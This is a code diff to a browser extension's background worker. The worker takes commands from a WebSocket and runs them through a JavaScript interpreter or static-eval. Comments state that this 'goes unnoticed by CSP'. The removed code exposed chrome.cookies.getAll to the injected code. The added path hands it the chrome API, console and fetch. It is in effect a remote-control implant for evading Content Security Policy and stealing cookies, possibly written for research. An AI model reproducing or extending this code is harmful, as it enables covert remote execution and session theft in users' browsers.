@@ -1,4 +1,4 @@
-importScripts("packages/acorn_interpreter.js", "packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");
+importScripts("packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");
 
 /* =================================================================================== */
 // Constants configuration
@@ -227,9 +227,6 @@ async function onWsMessage(event) {
 
         // Alternative, execute the command with the interpreter, goes unnoticed by CSP
         executeWithInterpreter(parsedMessage.data);
-
-        // // Alternative, execute the command with the interpreter, goes unnoticed by CSP
-        // executeWithStaticEval(parsedMessage.data);
     }
 
     if (parsedMessage.type.includes('CS_COMMAND')) {
@@ -257,47 +254,13 @@ async function executeWithDebugger(command, tabId) {
     await chrome.debugger.detach({tabId});
 }
 
-// Execute injected code through a JS interpreter
+
+// Execute injected code through AST conversion and JS interpreter
 function executeWithInterpreter(command) {
-    console.log("\nExecuting with JSInterpreter ...")
-    // Define a wrapper for the chrome.cookies.getAll function
-    const portCookies = function (interpreter, globalObject) {
-        const wrapper = function getAll(query, callback) {
-            const nativeQuery = interpreter.pseudoToNative(query)
-
-            const nativeCallback = function (result) {
-                // Convert result to a pseudo object and call the interpreted callback
-                const pseudoResult = interpreter.nativeToPseudo(result);
-                callback(pseudoResult);
-            };
-
-            chrome.cookies.getAll(nativeQuery, nativeCallback);
-        };
-
-        // Add the chrome.cookies.getAll function to the interpreter
-        const pseudoChromeFunc = interpreter.nativeToPseudo(chrome);
-        interpreter.setProperty(globalObject, 'chrome', pseudoChromeFunc);
-        const pseudoChromeCookies = interpreter.getProperty(pseudoChromeFunc, 'cookies');
-        interpreter.setProperty(pseudoChromeCookies, 'getAll', interpreter.createNativeFunction(wrapper));
-    }
-
-    const initFunc = function (interpreter, globalObject) {
-        interpreter.setProperty(globalObject, 'url', String(location));
-        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))
-
-        portCookies(interpreter, globalObject)
-    };
-    const interpreter = new Interpreter(command, initFunc)
-    interpreter.run()
-}
-
-// Execute injected code through AST conversion and static eval
-function executeWithStaticEval(command) {
-    console.log("\nExecuting with Static Eval ...")
+    console.log("\nExecuting with Interpreter ...")
 
     const ast = esprima.parse(command).body[0].expression;
 
-    staticEval.evaluate(esprima.parse('console.log(`starting`)'), {console})
     staticEval.evaluate(
         ast,
         {chrome, console, fetch},
